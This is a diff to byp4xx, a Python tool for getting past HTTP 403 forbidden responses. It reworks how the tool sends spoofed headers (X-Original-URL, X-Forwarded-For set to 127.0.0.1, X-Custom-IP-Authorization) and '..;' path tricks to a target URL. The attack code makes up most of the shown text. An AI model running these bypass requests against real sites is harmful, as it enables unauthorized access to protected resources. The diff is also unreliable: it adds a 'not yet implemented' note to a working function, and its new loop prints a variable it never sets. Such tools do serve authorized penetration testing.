@@ -25,6 +25,7 @@ def banner():
 def do_request(url, verb='HEAD', headers={}, payload=''):
 	"""Performs the request to the server via requests.
 	Global variables are used to access data populated by command-line flags.
+	TODO: not yet implemented
 	"""
 	global proxies
 	global redirects
@@ -68,26 +69,21 @@ def main():
 	parser = argparse.ArgumentParser(description='')
 	parser.add_argument('target', metavar='target',
 			help='The target host to scan')
-#	parser.add_argument('target_file', metavar='target-file',
-#			help='The list of in-scope hosts to scan')
-#	parser.add_argument('--manual-launch', default=False, action='store_true',
-#			help='If supplied, the script will create the scan but will not launch it.')
-	#Check all params
-	global proxies
-	proxies = {}
-	global timeout
-	timeout = 10
-
 	args = parser.parse_args()
-	if len(sys.argv)<2:
-		print("Usage: ./byp4xx <target>")
-		sys.exit(1)
 
-	#Check if URL starts with http/https
+	# Check if URL starts with http/https
 	if not args.target.startswith("http"):
-		print("Usage: ./byp4xx <target>")	
 		print("URL parameter does not start with http:// or https://")
 		sys.exit(1)
+
+	global proxies # TODO make this a CLI argument
+	proxies={}
+	#proxies = {
+	#	"http" : "http://127.0.0.1:8080",
+	#	"https" : "http://127.0.0.1:8080" # http must be used on the right-hand side, not https
+	#}
+	global timeout
+	timeout = 10
 
 	"""Parse basic URL and path from target parameter. 
 		e.g. for host https://site.com/foo
@@ -112,31 +108,34 @@ def main():
 	print("")
 
 	###########HEADERS
+	print('\033[92m\033[1m[+]HEADERS\033[0m')
+	# payloads sent to the base
+	headers = {
+		'X-Rewrite-URL':		endpoint,
+		'X-Originating-IP':		'127.0.0.1',
+	}
+	for header, value in headers.items():
+		print(f"{header}: {value} {do_request(url=base, headers={header: value})}")
+	# payloads sent to the full URL
 	headers = {
 		'Referer': 			full_target,
 		'X-Original-URL':		endpoint,
-		'X-Rewrite-URL':		endpoint,
-		'X-Originating-IP':		'127.0.0.1',
 		'X-Forwarded-For':		'127.0.0.1',
 		'X-Remote-IP':			'127.0.0.1',
 		'X-Client-IP':			'127.0.0.1',
 		'X-Host':			'127.0.0.1',
-		'X-Forwarded-Host':		'127.0.0.1'
+		'X-Forwarded-Host':		'127.0.0.1',
+		'X-Custom-IP-Authorization':	'127.0.0.1'
 	}
-	print('\033[92m\033[1m[+]HEADERS\033[0m')
 	for header, value in headers.items():
 		print(f"{header}: {value} {do_request(url=full_target, headers={header: value})}")
 
-	# Do this header separately because we want to try two different values
-	# If added to a dictionary, one value will clobber the other.
-	# There's probably a cleaner way to do this.
-	header = 'X-Custom-IP-Authorization'
-	values = [
-		full_target + '..;',
-		'127.0.0.1',
-	]
-	for values in values:
-		print(f"{header}: {value} {do_request(url=full_target, headers={header: value})}")
+	# Do this header separately because it is sent to a modified full URL
+	headers = {
+		'X-Custom-IP-Authorization':	'127.0.0.1'
+	}
+	for header in headers:
+		print(f"{header} + ..;: {value} {do_request(url=(full_target + '..;'), headers={header: value})}")
 
 	print("")
 #	print("Referer: ",curl_code_response(options+" -X GET -H \"Referer: "+payload+"\"",payload))
@@ -219,5 +218,3 @@ if __name__ == "__main__":
 		main()
 	except KeyboardInterrupt:
 		print("Aborting...")
-	except Exception as e:
-		print(e)
